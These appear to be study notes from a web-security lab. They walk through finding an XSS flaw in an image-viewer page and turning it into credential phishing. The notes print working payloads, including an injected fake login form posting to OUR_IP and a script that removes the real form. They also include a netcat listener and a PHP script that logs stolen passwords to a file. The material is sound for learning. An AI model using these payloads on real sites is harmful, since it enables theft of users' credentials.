## XSS Discovery
We start by attempting to find the XSS vulnerability in the web application at `/phishing` from the server at the end of this section. When we visit the website, we see that it is a simple online image viewer, where we can input a URL of an image, and it'll display it:
![[Pasted image 20251121143528.png]]

This form of image viewers is common in online forums and similar web applications. As we have control over the URL, we can start by using the basic XSS payload we've been using. But when we try that payload, we see that nothing gets executed, and we get the `dead image url` icon:
`http://SERVER_IP/phishing/index.php?url=<script>alert(window.origin)</script>`
![Online Image Viewer with Image URL input.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/103/xss_phishing_alert.jpg)


Found 2 payloads when looking to html source code:
`' onerror=alert(1)><`
`'><script>alert(1)</script>`
## Login Form Injection
Once we identify a working XSS payload, we can proceed to the phishing attack. To perform an XSS phishing attack, we must inject HTML code that displays a login form on the targeted page. This form should send the login information to a server we are listening on, such that once a user attempts to log in, we'd get their credentials.
We can easily find HTML code for a basic login form, or we can write our own login form. The following example should present a login form:
```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

Next, we should prepare our XSS code and test it on the vulnerable form. To write HTML code to the vulnerable page, we can use the JavaScript function `document.write()`, and use it in the XSS payload we found earlier in the XSS Discovery step. Once we minify our HTML code into a single line and add it inside the `write` function, the final JavaScript code should be as follows:
```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

## Cleaning Up
We can see that the URL field is still displayed, which defeats our line of "`Please login to continue`". So, to encourage the victim to use the login form, we should remove the URL field, such that they may think that they have to log in to be able to use the page. To do so, we can use the JavaScript function `document.getElementById().remove()` function.

To find the `id` of the HTML element we want to remove, we can open the `Page Inspector Picker` by clicking [`CTRL+SHIFT+C`] and then clicking on the element we need:
![[Pasted image 20251121145216.png]]

As we see in both the source code and the hover text, the `url` form has the id `urlform`:
```html
<form role="form" action="index.php" method="GET" id='urlform'>
    <input type="text" placeholder="Image URL" name="url">
</form>
```

As we see in both the source code and the hover text, the `url` form has the id `urlform`:
So, we can now use this id with the `remove()` function to remove the URL form:
```javascript
document.getElementById('urlform').remove();
```
Now, once we add this code to our previous JavaScript code (after the `document.write` function), we can use this new JavaScript code in our payload:

```javascript
'><script>document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();</script>
```

![[Pasted image 20251121150158.png]]

We also see that there's still a piece of the original HTML code left after our injected login form. This can be removed by simply commenting it out, by adding an HTML opening comment after our XSS payload: 
```html
...PAYLOAD... <!-- 
```
As we can see, this removes the remaining bit of original HTML code, and our payload should be ready. The page now looks like it legitimately requires a login:
![[Pasted image 20251121150250.png]]

## Credential Stealing
Finally, we come to the part where we steal the login credentials when the victim attempts to log in on our injected login form. If you tried to log into the injected login form, you would probably get the error `This site can’t be reached`. This is because, as mentioned earlier, our HTML form is designed to send the login request to our IP, which should be listening for a connection. If we are not listening for a connection, we will get a `site can’t be reached` error.

So, let us start a simple `netcat` server and see what kind of request we get when someone attempts to log in through the form. To do so, we can start listening on port 80 in our Pwnbox, as follows:
```shell
sudo nc -lvnp 80
```
Now, let's attempt to login with the credentials `test:test`, and check the `netcat` output we get (`don't forget to replace OUR_IP in the XSS payload with your actual IP`)
```shell
connect to [10.10.XX.XX] from (UNKNOWN) [10.10.XX.XX] XXXXX
GET /?username=test&password=test&submit=Login HTTP/1.1
Host: 10.10.XX.XX
...SNIP...
```

However, as we are only listening with a `netcat` listener, it will not handle the HTTP request correctly, and the victim would get an `Unable to connect` error, which may raise some suspicions. So, we can use a basic PHP script that logs the credentials from the HTTP request and then returns the victim to the original page without any injections. In this case, the victim may think that they successfully logged in and will use the Image Viewer as intended.

The following PHP script should do what we need, and we will write it to a file on our VM that we'll call `index.php` and place it in `/tmp/tmpserver/` (`don't forget to replace SERVER_IP with the ip from our exercise`):

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

Now that we have our `index.php` file ready, we can start a `PHP` listening server, which we can use instead of the basic `netcat` listener we used earlier:
```shell
> mkdir /tmp/tmpserver
> cd /tmp/tmpserver
> vi index.php #at this step we wrote our index.php file
> sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

If we check the `creds.txt` file in our Pwnbox, we see that we did get the login credentials
